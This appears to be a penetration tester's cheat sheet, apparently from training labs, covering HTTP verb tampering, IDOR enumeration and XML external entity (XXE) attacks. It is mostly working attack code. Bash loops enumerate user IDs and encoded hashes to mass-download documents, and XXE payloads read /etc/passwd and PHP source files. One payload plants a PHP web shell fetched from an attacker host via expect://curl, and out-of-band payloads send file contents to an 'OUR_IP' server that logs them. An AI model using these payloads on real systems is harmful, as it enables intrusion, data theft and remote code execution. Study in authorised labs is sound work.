## HTTP Verb Tampering
```
HEAD
PUT
DELETE
OPTIONS
PATCH
```

## IDOR
Identify IDORs in
- URL parameters & APIs
- AJAX calls
- understanding reference hashing/encoding
- comparing user roles
```
md5sum
base64
```

```
#!/bin/bash
 2
 3 url="http://83.136.255.170:55120"
 4
 5 for i in {1..20}; do
 6         for link in $(curl -X POST -d "uid=$i" -H "Content-Type: application/x-www-form-urlencoded" $url/documents.php | grep -oP "/documents/[^\"']+\.txt"); do
 7                 wget -q $url/$link
 8         done
 9 done
```

```
#!/bin/bash
 2
 3 for i in {1..20}; do
 4     for hash in $(echo -n $i | base64 -w 0); do
 5         curl "http://94.237.123.185:54572/download.php?contract=$hash"
 6     done
 7 done
```

## XXE
- Application may be in JSON, but we can convert it to XML.
- An input that we give it displays back to us (like an email that we input)
**Local File Disclosure
```
<!ENTITY xxe SYSTEM "http://localhost/email.dtd">
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">

<!DOCTYPE email [
 <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>

<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

**RCE
```
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 8081
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP:8081/shell.php'">
]>
```

**CDATA
1. Host external DTD
2. Reach out and join multiple entities
```
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000

<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
...
<email>&joined;</email>
```

**Error-based XXE
1. Check for error by changing <root> to <roo> or including a &nonExistingEntity; somewhere
2. Host xxe.dtd file with
3. Place &content; in the vulnerable parameter
```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
python3 -m http.server 8000
```
```
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```


**Blind
- When vulnerable variables are not displayed back to us, we will need the serer to make web requests to us containing the file
1. Host xxe.dtd file
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
2. Write this to index.php, then start server
```
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>

php -S 0.0.0.0:8000
```
3. Place payload in vulnerable page
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
